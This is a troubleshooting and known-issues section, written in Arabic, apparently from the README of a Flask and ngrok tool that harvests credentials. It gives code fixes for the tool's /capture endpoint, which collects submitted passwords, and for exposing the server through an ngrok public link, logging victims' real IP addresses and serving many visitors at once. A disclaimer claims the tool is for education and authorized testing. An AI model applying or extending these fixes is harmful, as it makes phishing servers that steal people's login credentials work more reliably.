## ⚠️ الأخطاء المعروفة والحلول

### 🔴 أخطاء حرجة (تمنع التشغيل)

#### 1. خطأ في Ngrok - عدم تحديد Region
**المشكلة:** `pyngrok.connect(port)` قد يفشل إذا كان التوكن يتطلب region محدد.
**الحل:** أضف معلمة region عند الاتصال:
```python
public_url = ngrok.connect(LOCAL_PORT, region="us").public_url  # us, eu, ap, au, sa, jp, in
```

#### 2. خطأ في capture() - عدم دعم JSON
**المشكلة:** `request.form.to_dict()` لا يعمل مع طلبات JSON.
**الحل:** استخدم دالة محسنة:
```python
@app.route('/capture', methods=['POST'])
def capture():
    global NEXT_ID
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    # ... باقي الكود
```

#### 3. خطأ في التبعيات - عدم وجود requirements.txt
**المشكلة:** لا يوجد ملف requirements.txt.
**الحل:** أنشئ الملف التالي:
```
flask>=2.0.0
pyngrok>=5.0.0
```

#### 4. خطأ في التوكن - انتهاء صلاحية Ngrok
**المشكلة:** إذا كان التوكن خاطئاً أو منتهياً، يتوقف البرنامج.
**الحل:** أضف معالجة استثناء أفضل:
```python
try:
    public_url = ngrok.connect(LOCAL_PORT).public_url
    print(f"[+] الرابط العام: {public_url}")
except Exception as e:
    print(f"[-] خطأ في Ngrok: {e}")
    print("[-] تأكد من صحة التوكن وصلاحيته")
    sys.exit(1)
```

### 🟡 تحذيرات (لا تمنع التشغيل لكنها تسبب مشاكل)

#### 5. IP خاطئ خلف Proxy
**المشكلة:** `request.remote_addr` يعيد 127.0.0.1 خلف Ngrok.
**الحل:** استخدم X-Forwarded-For:
```python
ip = request.headers.get('X-Forwarded-For', request.remote_addr)
```

#### 6. أداء التخزين
**المشكلة:** الكتابة على الملف في كل capture غير فعالة.
**الحل:** استخدم قائمة مؤقتة واكتب دورياً:
```python
# حفظ كل 5 دقائق أو عند الخروج
```

#### 7. إنهاء العملية بشكل قاسي
**المشكلة:** `os._exit(0)` يقتل العملية فوراً.
**الحل:** استخدم `sys.exit()` أو `ngrok.kill()` قبل الخروج.

#### 8. عدم وجود threaded=True
**المشكلة:** Flask يعالج طلباً واحداً في كل مرة.
**الحل:** أضف `threaded=True`:
```python
app.run(host='0.0.0.0', port=LOCAL_PORT, threaded=True, debug=False, use_reloader=False)
```

#### 9. خطوط Google غير محملة
**المشكلة:** بعض الصفحات تستخدم خطوط Cairo وTajawal دون تحميلها.
**الحل:** أضف رابط Google Fonts في HTML:
```html
<link href="https://fonts.googleapis.com/css2?family=Cairo&family=Tajawal&display=swap" rel="stylesheet">
```

## 🔒 التحذيرات الأمنية

> ⚠️ **تحذير قانوني وأخلاقي:**
> - هذه الأداة مخصصة **للأغراض التعليمية والاختبار الاختراقي المصرح به فقط**
> - استخدامها لسرقة بيانات الآخرين **غير قانوني** في معظم الدول
> - استخدامها ضد أشخاص دون إذنهم **جريمة إلكترونية**
> - المطور غير مسؤول عن أي استخدام غير قانوني

### 🔴 مشاكل أمنية في الكود الحالي
1. **عدم تشفير البيانات:** كلمات المرور تُخزن نصاً عادياً في JSON
2. **عدم التحقق من المدخلات:** يمكن حقن XSS أو إرسال بيانات ضارة
3. **عدم وجود rate limiting:** يمكن إرسال آلاف الطلبات في الثانية
4. **عدم وجود CORS protection:** يمكن استخدام الصفحات من أي موقع

### ✅ الحلول المقترحة
```python
# 1. تشفير البيانات الحساسة
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted = cipher.encrypt(data.encode())

# 2. التحقق من المدخلات
import re
def sanitize_input(data):
    return re.sub(r'[<>{}/]', '', str(data))

# 3. Rate limiting
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

# 4. CORS
from flask_cors import CORS
CORS(app, resources={r"/capture": {"origins": "*"}})  # أو حدد المصادر
```
